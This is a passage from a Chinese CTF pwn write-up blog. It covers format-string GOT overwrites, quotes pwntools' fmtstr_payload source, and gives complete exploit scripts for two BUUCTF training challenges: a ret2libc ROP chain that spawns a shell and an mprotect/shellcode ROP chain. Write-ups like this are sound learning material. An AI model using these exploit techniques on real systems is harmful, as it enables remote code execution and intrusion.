<span class="comment">#所以我们用 %4c 再输出4个空格即可向目标地址写入0x08</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#中间的 b&#x27;%xx$hhn&#x27; 视为 %n 不算在打印字符数内(个人看法)</span></span><br><span class="line"><span class="comment">#了解了原理后，我们以后就可以直接用</span></span><br><span class="line">    <span class="comment">#payload=fmtstr_payload(10,&#123;atoi_got:system_plt&#125;)</span></span><br><span class="line">    <span class="comment">#来生成payload了</span></span><br></pre></td></tr></table></figure>

<br/>

<p>参考链接4：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/83835">CCTF pwn3格式化字符串漏洞详细writeup - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p>64位格串：</p>
<p>参考链接5：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46521144/article/details/115129011">64位格式化字符串漏洞利用——axb_2019_fmt64_N1ch0l4s的博客-CSDN博客</a></p>
<p>参考链接6：[<a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/113242453">BUUCTF]PWN——axb_2019_fmt64（64位格式化字符串改got表）_Angel~Yan的博客-CSDN博客</a></p>
<p>参考链接7：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/194458?display=mobile">64位格式化字符串漏洞修改got表利用详解 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<br/>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">#以下是fmtstr_payload()的源代码</span><br><span class="line">#https://github.com/Gallopsled/pwntools/blob/0ff989a043/pwnlib/fmtstr.py#L103-178</span><br><span class="line">def fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;):</span><br><span class="line"></span><br><span class="line">    # &#x27;byte&#x27;: (number, step, mask, format, decalage)</span><br><span class="line">    config = &#123;</span><br><span class="line">        32 : &#123;</span><br><span class="line">            &#x27;byte&#x27;: (4, 1, 0xFF, &#x27;hh&#x27;, 8),</span><br><span class="line">            &#x27;short&#x27;: (2, 2, 0xFFFF, &#x27;h&#x27;, 16),</span><br><span class="line">            &#x27;int&#x27;: (1, 4, 0xFFFFFFFF, &#x27;&#x27;, 32)&#125;,</span><br><span class="line">        64 : &#123;</span><br><span class="line">            &#x27;byte&#x27;: (8, 1, 0xFF, &#x27;hh&#x27;, 8),</span><br><span class="line">            &#x27;short&#x27;: (4, 2, 0xFFFF, &#x27;h&#x27;, 16),</span><br><span class="line">            &#x27;int&#x27;: (2, 4, 0xFFFFFFFF, &#x27;&#x27;, 32)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if write_size not in [&#x27;byte&#x27;, &#x27;short&#x27;, &#x27;int&#x27;]:</span><br><span class="line">        log.error(&quot;write_size must be &#x27;byte&#x27;, &#x27;short&#x27; or &#x27;int&#x27;&quot;)</span><br><span class="line"></span><br><span class="line">    number, step, mask, formatz, decalage = config[context.bits][write_size]</span><br><span class="line"></span><br><span class="line">    # add wheres</span><br><span class="line">    payload = &quot;&quot;</span><br><span class="line">    for where, what in writes.items():</span><br><span class="line">        for i in range(0, number*step, step):</span><br><span class="line">            payload += pack(where+i)</span><br><span class="line"></span><br><span class="line">    numbwritten += len(payload)</span><br><span class="line">    fmtCount = 0</span><br><span class="line">    for where, what in writes.items():</span><br><span class="line">        for i in range(0, number):</span><br><span class="line">            current = what &amp; mask</span><br><span class="line">            if numbwritten &amp; mask &lt;= current:</span><br><span class="line">                to_add = current - (numbwritten &amp; mask)</span><br><span class="line">            else:</span><br><span class="line">                to_add = (current | (mask+1)) - (numbwritten &amp; mask)</span><br><span class="line"></span><br><span class="line">            if to_add != 0:</span><br><span class="line">                payload += &quot;%&#123;&#125;c&quot;.format(to_add)</span><br><span class="line">            payload += &quot;%&#123;&#125;$&#123;&#125;n&quot;.format(offset + fmtCount, formatz)</span><br><span class="line"></span><br><span class="line">            numbwritten += to_add</span><br><span class="line">            what &gt;&gt;= decalage</span><br><span class="line">            fmtCount += 1</span><br><span class="line"></span><br><span class="line">    return payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<br/>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ubuntu20.04下的pack()与.format测试结果</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>where = <span class="number">134529076</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>payload = pack(where)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(payload)</span><br><span class="line"><span class="string">b&#x27;4\xc0\x04\x08&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(where,<span class="built_in">hex</span>(where),payload1)</span><br><span class="line"><span class="number">134529076</span> <span class="number">0x804c034</span> <span class="string">b&#x27;4\xc0\x04\x08&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(<span class="number">10</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(a)</span><br><span class="line">%10c</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">123</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c = <span class="string">&quot;%&#123;&#125;c&quot;</span>.<span class="built_in">format</span>(b)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span>(c)</span><br><span class="line">%123c</span><br><span class="line"></span><br></pre></td></tr></table></figure>











<h2 id="栈"><a href="#栈" class="headerlink" title=" 栈 "></a><center><font color="green"> 栈 </font></center></h2><h3 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title=" ciscn_2019_c_1 "></a><center><font color="orange"> ciscn_2019_c_1 </font></center></h3><h4 id="题型：ret2libc"><a href="#题型：ret2libc" class="headerlink" title="题型：ret2libc"></a>题型：ret2libc</h4><p>参考链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhuangzhouQAQ/p/15034453.html">ciscn_2019_c_1 1 - 庄周恋蝶蝶恋花 - 博客园 (cnblogs.com)</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28120</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x400b28</span>       <span class="comment">#readelf -a &lt;binary&gt;</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span>    <span class="comment">#pop rdi ; ret</span></span><br><span class="line">ret = <span class="number">0x4006b9</span>        <span class="comment">#ret</span></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload  = <span class="string">b&#x27;\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line">puts_addr=u64(r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)    <span class="comment">#0 - libc6_2.27-3ubuntu1_amd64</span></span><br><span class="line">offset=puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">binsh=offset+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=offset+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(ret)        <span class="comment">#栈平衡操作</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;encrypted\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>



<br/>

<h3 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title=" get_started_3dsctf_2016 "></a><center><font color="orange"> get_started_3dsctf_2016 </font></center></h3><p>一道比较有意思的题，记录一下</p>
<p>参考链接1：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Nashi_Ko/article/details/109528155">get_started_3dsctf_2016_Nashi_Ko的博客-CSDN博客_get_started_3dsctf_2016</a></p>
<p>参考链接2：[<a target="_blank" rel="noopener" href="https://blog.csdn.net/mcmuyanga/article/details/108274091">BUUCTF]PWN11——get_started_3dsctf_2016_Angel~Yan的博客-CSDN博客</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">参靠脚本<span class="number">1</span>：</span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25231</span>)</span><br><span class="line"></span><br><span class="line">get_flag = <span class="number">0x80489A0</span></span><br><span class="line">main = <span class="number">0x8048A20</span></span><br><span class="line">fakeebp = <span class="number">0x0804E6A0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">56</span> + p32(get_flag) + p32(fakeebp) + p32(<span class="number">0x308CD64F</span>) + p32(<span class="number">0x195719D1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<br/>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">参靠脚本<span class="number">2</span>：</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">28526</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x080eb000</span></span><br><span class="line">pop_ebx_esi_edi_ret=<span class="number">0x080509a5</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x38</span> + p32(elf.sym[<span class="string">&#x27;mprotect&#x27;</span>]) + p32(pop_ebx_esi_edi_ret) + p32(bss) + p32(<span class="number">0x2c</span>) + p32(<span class="number">7</span>)</span><br><span class="line">payload += p32(elf.sym[<span class="string">&#x27;read&#x27;</span>]) + p32(bss) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">0x2c</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">payload=asm(shellcraft.sh())</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2022/08/25/ret2dlresolve/" rel="prev" title="ret2dlresolve">
                  <i class="fa fa-chevron-left"></i> ret2dlresolve
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2022/10/21/step1/" rel="next" title="step1">
                  step1 <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">xiaoxiaoxy</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
  </div>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  





  





</body>
</html>
